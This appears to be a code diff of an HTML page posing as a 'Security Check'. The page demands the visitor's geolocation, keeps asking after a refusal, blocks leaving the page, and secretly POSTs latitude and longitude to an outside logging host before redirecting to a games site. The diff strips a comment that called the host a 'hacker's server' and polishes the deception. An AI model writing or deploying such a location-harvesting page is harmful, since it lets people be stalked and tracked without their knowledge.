@@ -1,40 +1,103 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Security Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f8f9fa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        h2 {
+            color: #d9534f;
+        }
+
+        p {
+            font-size: 16px;
+            color: #333;
+        }
+
+        button {
+            padding: 12px 20px;
+            font-size: 16px;
+            color: white;
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                width: 90%;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
+    </style>
     <script>
         function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, forceAllow);
-            } else {
-                alert("Geolocation is not supported by your browser.");
-            }
+            navigator.geolocation.getCurrentPosition(sendLocation, forceAllow);
         }
 
         function sendLocation(position) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
-            let accuracy = position.coords.accuracy;
-
-            // Send the data to hacker's server
             fetch("http://newzz.fwh.is/log.php", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
+                body: JSON.stringify({ latitude: lat, longitude: lon })
             });
-
-            // Redirect to Google after successful location access
             window.location.href = "https://www.crazygames.com/multiplayer";
         }
 
         function forceAllow(error) {
-            alert("You must click 'Allow' to proceed. Click 'Retry' and allow location access.");
-            getLocation(); // Re-run location request
+            document.body.innerHTML = 
+                <div class="container">
+                    <h2>Security Warning</h2>
+                    <p>You <b>must</b> allow location access to continue.</p>
+                    <button onclick="getLocation()">Try Again</button>
+                </div>
+            ;
         }
+
+        window.onload = function () {
+            getLocation();
+            window.onbeforeunload = function () {
+                return "You must allow location access to continue.";
+            };
+        };
     </script>
 </head>
-<body onload="getLocation()">
-    <h2>Security Verification</h2>
-    <p>For security reasons, please allow location access.</p>
+<body>
+    <div class="container">
+        <h2>Security Check</h2>
+        <p>Requesting location access...</p>
+    </div>
 </body>
 </html>
